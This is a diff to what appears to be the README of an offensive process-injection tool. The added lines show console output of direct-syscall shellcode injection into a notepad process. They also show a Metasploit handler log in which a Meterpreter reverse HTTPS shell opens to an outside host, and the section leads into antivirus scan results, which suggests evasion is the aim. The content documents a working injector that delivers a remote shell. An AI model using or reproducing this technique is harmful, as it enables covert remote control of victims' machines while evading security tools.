@@ -23,6 +23,33 @@ Syscall codes can and do change between operating systems. You must change the t
 
 And remember, the code looks for an instance of notepad to inject into, it is trivial to change this, or even spawn a surregate process to inject in to.
 
+# Example
+Execution of the code is shown below:
+
+```
+[+] Base Address of ntdll is 0x7FFE23450000
+[+] Target PID is 40140
+[+] Syscall NtOpenProcess on 40140
+[+] Return, NTSTATUS=Success, hProcess=0x2F4
+[+] Syscall NtAllocateVirtualMemory on 0x2F4
+[+] Return, NTSTATUS=Success, baseAddress=0x1D2A9120000
+[+] Syscall NtWriteVirtualMemory to 0x1D2A9120000
+[+] Return, NTSTATUS=Success, bytesWritten=0x736
+[+] Syscall NtProtectVirtualMemory on 0x1D2A9120000
+[+] Return, NTSTATUS=Success
+[+] Syscall NtCreateThreadEx to 0x1D2A9120000
+[+] Return, NTSTATUS=Success, hThread=0x896
+```
+
+And the meterpreter shell:
+
+```
+msf6 exploit(multi/handler) > 
+[*] Started HTTPS reverse handler on https://192.168.1.228:443
+[*] https://192.168.1.228:443 handling request from 192.168.1.142; (UUID: bprg2hzm) Staging x64 payload (201308 bytes) ...
+[*] Meterpreter session 1 opened (192.168.1.228:443 -> 192.168.1.142:58551) at 2021-10-05 12:53:47 +0100
+```
+
 # AV Scan Results
 
 The binary was scanned using [antiscan.me](https://antiscan.me/scan/new/result?id=2kut9uVkyXQW) on 05/10/2021.
